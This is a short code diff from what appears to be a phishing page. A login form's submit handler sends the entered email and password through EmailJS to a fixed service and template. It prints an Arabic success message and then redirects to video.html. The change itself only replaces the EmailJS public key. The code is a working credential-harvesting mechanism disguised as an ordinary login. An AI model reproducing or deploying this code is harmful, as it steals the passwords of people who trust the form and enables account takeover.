@@ -7,7 +7,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
         email: email,
         password: password
-    }, "T7T1mrIFK0cukkI5Jhhze")
+    }, "nU3mtzMzW9UbQ9Bp3")
     .then(function(response) {
         console.log("تم الإرسال بنجاح!", response.status, response.text);
         window.location.href = "video.html";
